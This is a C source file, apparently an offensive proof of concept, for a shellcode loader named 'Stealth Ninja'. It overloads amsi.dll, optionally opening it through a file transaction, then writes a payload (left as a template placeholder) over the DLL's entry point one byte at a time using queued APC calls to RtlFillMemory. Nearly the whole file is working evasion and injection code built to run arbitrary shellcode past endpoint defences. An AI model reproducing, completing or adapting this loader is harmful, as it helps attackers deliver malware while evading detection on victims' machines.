/****
 * Stealth Ninja loader: a APC write method with DLL overloading
 * a PoC only, no DLL searching or error handling
 * Author: Thomas X Meng
 * 
*/
#include <windows.h>
#include <winternl.h> // For NTSTATUS definitions
#include <psapi.h>
#include <stdlib.h> // For ExitProcess
#include <tlhelp32.h>
#include <stdio.h>
#include <ctype.h>

#include <stdint.h>

const char* ProtectionToString(DWORD protection) {
    switch (protection) {
        case PAGE_NOACCESS: return "PAGE_NOACCESS";
        case PAGE_READONLY: return "PAGE_READONLY";
        case PAGE_READWRITE: return "PAGE_READWRITE";
        case PAGE_WRITECOPY: return "PAGE_WRITECOPY";
        case PAGE_EXECUTE: return "PAGE_EXECUTE";
        case PAGE_EXECUTE_READ: return "PAGE_EXECUTE_READ";
        case PAGE_EXECUTE_READWRITE: return "PAGE_EXECUTE_READWRITE";
        case PAGE_EXECUTE_WRITECOPY: return "PAGE_EXECUTE_WRITECOPY";
        case PAGE_GUARD: return "PAGE_GUARD";
        case PAGE_NOCACHE: return "PAGE_NOCACHE";
        case PAGE_WRITECOMBINE: return "PAGE_WRITECOMBINE";
        default: return "UNKNOWN";
    }
}


// Necessary for certain definitions like ACCESS_MASK
#ifndef WIN32_NO_STATUS
#define WIN32_NO_STATUS
#include <ntstatus.h>
#undef WIN32_NO_STATUS
#else
#include <ntstatus.h>
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

//////////////////////////////////// TxF: 

// Define the NT API function pointers
typedef LONG(__stdcall* NtCreateSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
// typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

typedef NTSTATUS(__stdcall* NtCreateTransaction_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);

NtCreateSection_t NtCreateSection;
NtMapViewOfSection_t NtMapViewOfSection;
NtCreateTransaction_t NtCreateTransaction;


// Load NT functions
void LoadNtFunctions() {
    HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
    NtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtCreateTransaction = (NtCreateTransaction_t)GetProcAddress(hNtdll, "NtCreateTransaction");
}


/////////////////////////////////////// APC Write:

#define NT_CREATE_THREAD_EX_SUSPENDED 1
#define NT_CREATE_THREAD_EX_ALL_ACCESS 0x001FFFFF
// Declaration of undocumented functions and structures
typedef ULONG (NTAPI *NtQueueApcThread_t)(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcRoutineContext, PVOID ApcStatusBlock, PVOID ApcReserved);
typedef ULONG (NTAPI *NtCreateThreadEx_t)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);

DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength) {
    HANDLE hThread = NULL;
    NtQueueApcThread_t pNtQueueApcThread = NULL;
    NtCreateThreadEx_t pNtCreateThreadEx = NULL;
    void *pRtlFillMemory = NULL;
    
    // Locate the functions
    pNtQueueApcThread = (NtQueueApcThread_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueueApcThread");
    pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
    pRtlFillMemory = (void*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlFillMemory"); //This uses stdcall calling convention and called by NtQueueApcThread
    //

    if (!pNtQueueApcThread || !pNtCreateThreadEx || !pRtlFillMemory) {
        printf("[-] Failed to locate required functions.\n");
        return 1;
    }

    // Create a suspended thread in the target process
    ULONG status = pNtCreateThreadEx(&hThread, NT_CREATE_THREAD_EX_ALL_ACCESS, NULL, hProcess, (PVOID)(ULONG_PTR)ExitThread, NULL, NT_CREATE_THREAD_EX_SUSPENDED, 0, 0, 0, NULL);
    // ULONG status = pNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, (LPTHREAD_START_ROUTINE)ExitThread, NULL, CREATE_SUSPENDED, 0, 0, 0, NULL);
    if (status != 0) {
        printf("[-] Failed to create remote thread: %lu\n", status);
        return 1;
    }

    // Write memory using APCs
    for (DWORD i = 0; i < dwLength; i++) {
        BYTE byte = pData[i];

        // Print only for the first and last byte
        if (i == 0 || i == dwLength - 1) {
            printf("Writing byte 0x%02X to address %p\n", byte, (void*)((BYTE*)pAddress + i));
        }
        ULONG result  = pNtQueueApcThread(hThread, pRtlFillMemory, pAddress + i, (PVOID)1, (PVOID)(ULONG_PTR)byte); 
        if (result != STATUS_SUCCESS) {
            printf("Failed to queue APC. NTSTATUS: 0x%X\n", result);
            TerminateThread(hThread, 0);
            CloseHandle(hThread);
            return 1;
        }
    }
    // for(DWORD i = 0; i < dwLength; i++) {
    //     // Schedule a call to RtlFillMemory to update the current byte
    //     if(pNtQueueApcThread(hThread, pRtlFillMemory, (void*)((BYTE*)pAddress + i), (void*)1, (void*)*(BYTE*)(pData + i)) != 0) {
    //         // If there's an error, terminate and close the thread, then return
    //         TerminateThread(hThread, 0);
    //         CloseHandle(hThread);
    //         return 1;
    //     }
    // }
    // for (DWORD i = 0; i < dwLength; i++) {
    //     BYTE byte = pData[i];
    //     PVOID targetAddress = (PVOID)((BYTE*)pAddress + i);

    //     // Output the byte and target address
        // printf("[+] Writing byte 0x%02X to address %p\n", byte, targetAddress);

    //     if (pNtQueueApcThread(hThread, pRtlFillMemory, targetAddress, (PVOID)1, (PVOID)(ULONG_PTR)byte) != 0) {
    //         printf("[-] Failed to queue APC.\n");
    //         TerminateThread(hThread, 0);
    //         CloseHandle(hThread);
    //         return 1;
    //     }
    // }

    // Resume the thread to execute queued APCs
    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    return 0;
}



////////////////////////////////////////

unsigned char magiccode[] = ####SHELLCODE####;

int main(int argc, char *argv[])
{
    printf("Starting program...\n");

    // // Open the DLL file to read headers
    // HANDLE fileHandle = CreateFile("C:\\windows\\system32\\amsi.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    // if (fileHandle == INVALID_HANDLE_VALUE) {
    //     printf("Failed to open DLL file. Error: %lu\n", GetLastError());
    //     return 1;
    // } else {
	// 	printf("[+] DLL file amsi.dll opened.\n");
	// }

    // HANDLE fileMapping = CreateFileMapping(fileHandle, NULL, PAGE_READONLY, 0, 0, NULL);
    // if (fileMapping == NULL) {
    //     printf("Failed to create file mapping. Error: %lu\n", GetLastError());
    //     CloseHandle(fileHandle);
    //     return 1;
    // } else {
	// 	printf("[+] File mapping created.\n");
	// }

    // LPVOID fileBase = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
    // if (fileBase == NULL) {
    //     printf("Failed to map view of file. Error: %lu\n", GetLastError());
    //     CloseHandle(fileMapping);
    //     CloseHandle(fileHandle);
    //     return 1;
    // } else {
	// 	printf("[+] File mapped.\n");
	//  }

    // Default value for bTxF
    BOOL bTxF = FALSE;

    // Check if the user provided command-line arguments
    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "-txf") == 0) {
            bTxF = TRUE;
            break;
        }
    }

    // Display debug message about transaction mode
    printf("[+] Transaction Mode: %s\n", bTxF ? "Enabled" : "Disabled");

    LoadNtFunctions(); // Load the NT functions

    wchar_t dllPath[] = L"C:\\windows\\system32\\amsi.dll"; // Path to the DLL
    HANDLE fileHandle;
    if (bTxF) {
        OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES) };
        HANDLE hTransaction;
        NTSTATUS NtStatus = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &ObjAttr, nullptr, nullptr, 0, 0, 0, nullptr, nullptr);
        if (!NT_SUCCESS(NtStatus)) {
            printf("[-] Failed to create transaction (error 0x%x)\n", NtStatus);
            return 1;
        }

        // Display debug message about creating transaction
        printf("[+] Transaction created successfully.\n");

        fileHandle = CreateFileTransactedW(dllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr, hTransaction, nullptr, nullptr);
        if (fileHandle == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open DLL file transacted. Error: %lu\n", GetLastError());
            CloseHandle(hTransaction);
            return 1;
        }

        // Display debug message about opening DLL file transacted
        printf("[+] DLL file opened transacted successfully.\n");
    } else {
        fileHandle = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (fileHandle == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open DLL file. Error: %lu\n", GetLastError());
            return 1;
        }

        // Display debug message about opening DLL file
        printf("[+] DLL file opened successfully.\n");
    }
    // Open the DLL file with optional transaction
    // HANDLE fileHandle = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    // if (fileHandle == INVALID_HANDLE_VALUE) {
    //     printf("Failed to open DLL file. Error: %lu\n", GetLastError());
    //     return 1;
    // }

    // Create a section from the file
    HANDLE hSection = NULL;
    // LONG status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
    LONG status = NtCreateSection(&hSection, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
    if (status != 0) {
        printf("NtCreateSection failed. Status: %x\n", status);
        CloseHandle(fileHandle);
        return 1;
    }

    // Map the section into the process
    PVOID fileBase = NULL;
    SIZE_T viewSize = 0;
    status = NtMapViewOfSection(hSection, GetCurrentProcess(), &fileBase, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);
    if (status != 0) {
        printf("NtMapViewOfSection failed. Status: %x\n", status);
        CloseHandle(hSection);
        CloseHandle(fileHandle);
        return 1;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
    DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;

    // Load the DLL to get its base address in current process
    HMODULE hDll = LoadLibraryW(dllPath);

    if (hDll == NULL) {
        printf("Failed to load DLL. Error: %lu\n", GetLastError());
        UnmapViewOfFile(fileBase);
        CloseHandle(fileHandle);
        return 1;
    } else { 
		printf("[+] DLL loaded.\n");
	}

    // Calculate the AddressOfEntryPoint in current process
    // LPVOID dllEntryPoint = (LPVOID)(entryPointRVA + (DWORD_PTR)hDll);
	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
    PVOID dllEntryPoint = (PVOID)(entryPointRVA + (DWORD_PTR)hDll);
	printf("[+] DLL entry point: %p\n", dllEntryPoint);

    // Overwrite the AddressOfEntryPoint with magiccode
    // SIZE_T bytesWritten;
    // BOOL result = WriteProcessMemory(GetCurrentProcess(), dllEntryPoint, magiccode, sizeof(magiccode), &bytesWritten);

    ///////////////////////////// Let's get the memory protection of the target DLL's entry point before any modification: 
    HANDLE hProcess = GetCurrentProcess();
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T result;

    result = VirtualQueryEx(hProcess, dllEntryPoint, &mbi, sizeof(mbi));

    if (result == 0) {
        printf("VirtualQueryEx failed. Error: %lu\n", GetLastError());
    } else {
        printf("[+] Default memory protection before change in target DLL is: %s\n", ProtectionToString(mbi.Protect));
    }

    SIZE_T magiccodeSize = sizeof(magiccode);

    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, dllEntryPoint, magiccodeSize, PAGE_READWRITE, &oldProtect)) {
        printf("VirtualProtectEx failed to change memory protection. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    // printf("[+] Default memory protection before change in target DLL was: %s\n", ProtectionToString(oldProtect));

    if (hProcess != NULL) {
        result = WriteProcessMemoryAPC(hProcess, (BYTE*)dllEntryPoint, (BYTE*)magiccode, magiccodeSize); 
    }

    if (!VirtualProtectEx(hProcess, dllEntryPoint, magiccodeSize, oldProtect, &oldProtect)) {
        printf("VirtualProtectEx failed to restore original memory protection. Error: %lu\n", GetLastError());
    }
    printf("[+] Memory protection after change was: %s\n", ProtectionToString(oldProtect));

    if (!result) {
        printf("Failed to write magiccode. Error: %lu\n", GetLastError());
        FreeLibrary(hDll);
        CloseHandle(hSection);
        UnmapViewOfFile(fileBase);
        // CloseHandle(fileMapping);
        CloseHandle(fileHandle);
        return 1;
    } else {
		printf("[+] Magic code written.\n");
	}

    Sleep(50000); // Sleep for 5 seconds
    // !!! The new implementation will cause error if we create thread,
    // Create a thread to execute at the DLL's entry point
    // DWORD threadID;
    // HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, &threadID);
    // if (hThread == NULL) {
    //     printf("Failed to create a thread. Error: %lu\n", GetLastError());
    //     FreeLibrary(hDll);
    //     UnmapViewOfFile(fileBase);
    //     // CloseHandle(fileMapping);
    //     CloseHandle(fileHandle);
    //     CloseHandle(hSection);
    //     return 1;
    // }
	printf("[+] No need to create thread.\n");

    // Wait for the thread to execute and then clean up
    // WaitForSingleObject(hThread, INFINITE);
    // if (WaitForSingleObject(hThread, 5000) == WAIT_TIMEOUT) { // Wait 5 seconds
    //     TerminateThread(hThread, 0); // Forcibly terminates the thread
    //     printf("[+] Default thread was terminated.\n");
    // }

    // Get the exit code of the thread.
    // DWORD exitCode = 0;
    // if (!GetExitCodeThread(hThread, &exitCode)) {
    //     printf("[-] GetExitCodeThread failed: %d\n", GetLastError());
    // } else {
    //     printf("[+] Thread exited with code: %lu\n", exitCode);
    // }

    // CloseHandle(hThread);
    FreeLibrary(hDll);
    UnmapViewOfFile(fileBase);
    // CloseHandle(fileMapping);
    CloseHandle(fileHandle);
    CloseHandle(hSection);
    // Terminate the process
    ExitProcess(0);
    return 0;


}